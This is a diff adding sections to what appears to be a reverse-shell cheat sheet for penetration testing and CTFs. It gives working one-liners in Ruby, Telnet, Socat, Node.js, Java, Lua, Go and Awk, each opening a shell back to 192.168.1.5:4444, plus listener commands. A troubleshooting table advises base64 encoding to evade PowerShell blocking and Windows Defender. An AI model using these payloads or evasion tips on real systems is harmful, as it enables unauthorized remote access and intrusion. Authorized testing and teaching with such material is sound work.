@@ -120,21 +120,193 @@ php -r '$sock=fsockopen("192.168.1.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ruby -rsocket -e 'c=TCPSocket.new("192.168.1.5",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
+- Alternative
+
+```bash
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.5",4444);while(cmd=c.gets);begin;c.print(eval(cmd).to_s);rescue;end;end'
+```
+
+[🔝 Back to Top](#top)
 
 
+# 8. Telnet
+
+- Two connections (input + output)
+
+```bash
+telnet 192.168.1.5 4444 | /bin/sh | telnet 192.168.1.5 5555
+```
+
+- With mkfifo
+
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | telnet 192.168.1.5 4444 > /tmp/f
+```
+  
+[🔝 Back to Top](#top)
+
+
+
+# 9. Socat
+
+- Attacker (listener)
+
+```bash
+socat TCP-LISTEN:4444 -
+```
+
+- Target (reverse shell)
+
+```bash
+socat TCP:192.168.1.5:4444 EXEC:/bin/sh
+```
+
+- Encrypted socat (OpenSSL)
+
+
+  - Listener (attacker)
+    ```bash
+    socat OPENSSL-               LISTEN:4444,cert=server.pem,verify=0 -
+    ```
+  - Target
+    ```bash
+    socat   OPENSSL:192.168.1.5:4444,verify=0    EXEC:/bin/sh
+     ```
+
+[🔝 Back to Top](#top)
 
 
   
+# 10. Node.js
+
+```bash 
+node -e 'require("net").connect(4444,"192.168.1.5",function(){require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})});'
+```
+
+- Alternative
+
+```bash
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4444, "192.168.1.5", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+```
+
+[🔝 Back to Top](#top)
 
 
 
+# 11. Java
+
+```bash
+public class RevShell {
+    public static void main(String[] args) throws Exception {
+        Runtime r = Runtime.getRuntime();
+        String cmd[] = {"/bin/sh", "-c", "exec 5<>/dev/tcp/192.168.1.5/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+        r.exec(cmd);
+    }
+}
+```
+
+- One-liner (wrapped)
+
+```bash
+java -c 'import java.io.*;import java.net.*;public class Rev {public static void main(String[] args) throws Exception {Socket s=new Socket("192.168.1.5",4444);Process p=Runtime.getRuntime().exec("/bin/sh");new Thread(() -> {try {int c;while((c=p.getInputStream().read())!=-1) s.getOutputStream().write(c);} catch(Exception e){}}).start();new Thread(() -> {try {int c;while((c=s.getInputStream().read())!=-1) p.getOutputStream().write(c);} catch(Exception e){}}).start();p.waitFor();}}'
+```
+
+[🔝 Back to Top](#top)
 
 
 
+# 12. Lua
+
+```bash
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.1.5',4444);os.execute('/bin/sh -i <&3 >&3 2>&3');"
+```
+
+[🔝 Back to Top](#top)
 
 
 
-  
+# 13. Golang
+
+```bash
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.5:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go && go run /tmp/shell.go
+```
+
+[🔝 Back to Top](#top)
+
+
+
+# 14. Awk
+
+```bash
+awk 'BEGIN {s = "/inet/tcp/0/192.168.1.5/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
+[🔝 Back to Top](#top)
+
+
+
+# 15. Troubleshooting
+
+|Problem |Likely Fix|
+|---|----|
+|No connection |Check LHOST (your IP), LPORT (your port), and firewall rules|
+|Shell dies immediately| Add -i for interactive, or use python -c 'import pty; pty.spawn("/bin/bash")' to upgrade|
+|nc -e not available| Use the pipe/mkfifo version or switch to bash/python|
+|PowerShell blocked |Use the base64 encoded version to bypass some detections|
+|Command not found| Install the missing binary or use an alternative method|
+|Windows Defender catches it |Encode with base64, use PowerShell, or use a different language|
+|Listener not catching| Make sure your listener is running: nc -lvnp 4444|
+|Reverse shell has no TTY |Run python -c 'import pty; pty.spawn("/bin/bash")' after connection|
+
+
+
+---
+
+# Quick Listener Setup
+
+- Before running any reverse shell, start your listener:
+
+```bash
+nc -lvnp 4444
+```
+
+- Or with socat:
+
+```bash
+socat TCP-LISTEN:4444 -
+```
+
+[🔝 Back to Top](#top)
+
+
+
+---
+
+## ✅ Completion Note
+
+- This document covers the most common reverse shell one-liners across multiple languages and platforms. Not every possible variation is included—but what's here is what you'll actually use in the field.
+
+- Each command was tested (where possible) and formatted for quick copy-paste during engagements, CTFs, or authorized testing.
+
+**Need a quick reminder?** → [📄 QUICKREF.md](QUICKREF.md) (one-page cheat sheet)
+
+---
+
+## 📜 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
 
 
 
